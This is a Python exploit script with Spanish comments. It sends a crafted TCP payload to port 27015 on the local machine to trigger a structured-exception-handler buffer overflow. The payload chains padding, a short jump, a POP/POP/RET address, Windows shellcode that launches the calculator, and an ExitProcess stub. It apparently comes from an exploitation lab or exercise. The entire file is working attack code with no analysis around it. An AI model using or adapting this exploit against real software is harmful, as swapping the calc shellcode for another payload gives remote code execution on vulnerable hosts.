#!/usr/bin/python

import socket
import sys
import binascii
from subprocess import Popen, PIPE

winexec_calc_shellcode = b'31c94931d2e347526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7'
winexec_calc_shellcode = binascii.unhexlify(winexec_calc_shellcode)

TCP_IP = socket.gethostname()
TCP_PORT = 27015
BUFFER_SIZE = 1024

MESSAGE =b""

buffer_recv = b"\xFE\xCA\xFE\xCA"
vQuintoByte = b"\x90"             # se usa como size en memcpy (provoca una excepcion dentro del memcpy)
buffer_memcpy = b"A"*1
var_87 = b"B"*131
var_4 = b"C"*4
next_frame = b"D"*4
returnaddress = b"E"*4
basura = b"F"*52
next_seh = b"\xEB\x06\x90\x90"   # JMP para saltar por encima de los opcodes del seh
seh = b"\x5C\x1A\x40\x00"        # POP / POP / RET

ExitProcess = b"\x68\xFF\x00\x00\x00\xE8\x18\x23\x26\x00" # Para terminar el proceso y que no se ejecute varias veces la calculadora

MESSAGE += buffer_recv + vQuintoByte + buffer_memcpy 
MESSAGE += var_87 + var_4 + next_frame + returnaddress
MESSAGE += basura + next_seh + seh 
MESSAGE += winexec_calc_shellcode 
MESSAGE += ExitProcess


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(MESSAGE)
data = s.recv(BUFFER_SIZE)
s.close()
print("received data:", data)